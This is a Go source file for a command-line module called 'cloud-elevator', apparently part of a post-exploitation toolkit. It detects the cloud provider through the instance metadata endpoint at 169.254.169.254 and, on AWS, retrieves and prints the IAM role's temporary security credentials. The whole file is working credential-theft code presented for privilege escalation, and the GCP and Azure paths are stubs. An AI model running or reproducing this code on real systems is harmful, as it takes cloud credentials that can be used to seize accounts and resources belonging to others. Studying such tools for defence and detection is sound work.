package modules

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"

	"github.com/spf13/cobra"
)

// CloudElevatorCmd represents the cloud privilege escalation command
var CloudElevatorCmd = &cobra.Command{
	Use:   "cloud-elevator",
	Short: "Attempt to escalate privileges in cloud environments",
	Long:  `Attempts to discover and exploit cloud metadata services for privilege escalation in AWS, GCP, and Azure environments`,
	Run: func(cmd *cobra.Command, args []string) {
		ExecuteCloudElevator()
	},
}

type CloudProvider string

const (
	AWS   CloudProvider = "AWS"
	GCP   CloudProvider = "GCP"
	AZURE CloudProvider = "AZURE"
)

func DetectCloudProvider() CloudProvider {
	client := http.Client{Timeout: 2 * time.Second}
	urls := map[CloudProvider]string{
		AWS:   "http://169.254.169.254/latest/meta-data/",
		GCP:   "http://169.254.169.254/computeMetadata/v1/",
		AZURE: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
	}

	headers := map[CloudProvider]http.Header{
		GCP:   {"Metadata-Flavor": {"Google"}},
		AZURE: {"Metadata": {"true"}},
	}

	for provider, url := range urls {
		req, _ := http.NewRequest("GET", url, nil)
		if hdrs, ok := headers[provider]; ok {
			req.Header = hdrs
		}

		resp, err := client.Do(req)
		if err == nil && resp.StatusCode == 200 {
			return provider
		}
	}
	return ""
}

func DumpAWSCreds() {
	fmt.Println("[*] Attempting to dump AWS metadata credentials...")
	base := "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

	rolesResp, err := http.Get(base)
	if err != nil {
		fmt.Println("[-] Failed to get IAM role name")
		return
	}
	defer rolesResp.Body.Close()
	role, _ := ioutil.ReadAll(rolesResp.Body)

	credResp, err := http.Get(base + string(role))
	if err != nil {
		fmt.Println("[-] Failed to get credentials")
		return
	}
	defer credResp.Body.Close()
	creds, _ := ioutil.ReadAll(credResp.Body)

	var parsed map[string]interface{}
	json.Unmarshal(creds, &parsed)
	pretty, _ := json.MarshalIndent(parsed, "", "  ")
	fmt.Println(string(pretty))
}

func ExecuteCloudElevator() {
	fmt.Println("[*] Running cloudElevator module...")

	provider := DetectCloudProvider()
	if provider == "" {
		fmt.Println("[-] Cloud metadata endpoint unreachable. Not running in cloud or blocked.")
		return
	}

	fmt.Printf("[+] Detected Cloud Provider: %s\n", provider)

	switch provider {
	case AWS:
		DumpAWSCreds()
	case GCP:
		fmt.Println("[!] GCP enumeration coming soon...")
	case AZURE:
		fmt.Println("[!] Azure enumeration coming soon...")
	}
}
